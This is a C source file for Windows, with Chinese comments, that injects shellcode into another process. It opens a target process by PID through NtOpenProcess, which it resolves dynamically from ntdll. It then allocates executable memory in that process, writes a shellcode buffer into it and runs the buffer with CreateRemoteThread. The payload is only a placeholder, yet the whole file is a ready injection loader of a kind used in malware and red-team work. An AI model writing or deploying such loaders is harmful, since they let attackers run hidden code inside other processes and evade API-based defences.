#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#pragma comment(lib, "ntdll")

#define InitializeObjectAttributes(p,n,a,r,s) { \
  (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
  (p)->RootDirectory = (r); \
  (p)->Attributes = (a); \
  (p)->ObjectName = (n); \
  (p)->SecurityDescriptor = (s); \
  (p)->SecurityQualityOfService = NULL; \
}

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
  HANDLE             ProcessHandle,
  PVOID              *BaseAddress,
  ULONG              ZeroBits,
  PULONG             RegionSize,
  ULONG              AllocationType,
  ULONG              Protect
);

typedef struct _UNICODE_STRING
{
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
  ULONG              Length;
  HANDLE             RootDirectory;
  PUNICODE_STRING    ObjectName;
  ULONG              Attributes;
  PVOID              SecurityDescriptor;
  PVOID              SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
  PVOID              UniqueProcess;
  PVOID              UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef NTSTATUS(NTAPI* pNtOpenProcess)(
  PHANDLE            ProcessHandle,
  ACCESS_MASK        AccessMask,
  POBJECT_ATTRIBUTES ObjectAttributes,
  PCLIENT_ID         ClientID
);

//嵌入Shellcode
unsigned char shellcode[] = "Shellcode";
unsigned int shellcode_len = sizeof(shellcode);

int main(int argc, char* argv[]) {
  HANDLE ph; // process handle
  HANDLE rt; // remote thread
  PVOID rb; // remote buffer
  DWORD pid; // process ID

  pid = atoi(argv[1]);
  OBJECT_ATTRIBUTES oa;

  CLIENT_ID cid;

  InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
  cid.UniqueProcess = (PVOID) pid;
  cid.UniqueThread = 0;

  //加载ntdll.dll
  HMODULE ntdll = GetModuleHandleA("ntdll");
  printf("PID: %i", pid);

  pNtOpenProcess myNtOpenProcess = (pNtOpenProcess)GetProcAddress(ntdll, "NtOpenProcess");
  pNtAllocateVirtualMemory myNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");

  //打开远程进程
  myNtOpenProcess(&ph, PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, &oa, &cid);

  if (!ph) {
    printf("failed to open process :(\n");
    return -2;
  }

  //为远程进程分配内存缓冲区
  myNtAllocateVirtualMemory(ph, &rb, 0, (PULONG)&shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

  //写入数据
  WriteProcessMemory(ph, rb, shellcode, shellcode_len, NULL);

  //启动新线程
  rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
  CloseHandle(ph);
  return 0;
}
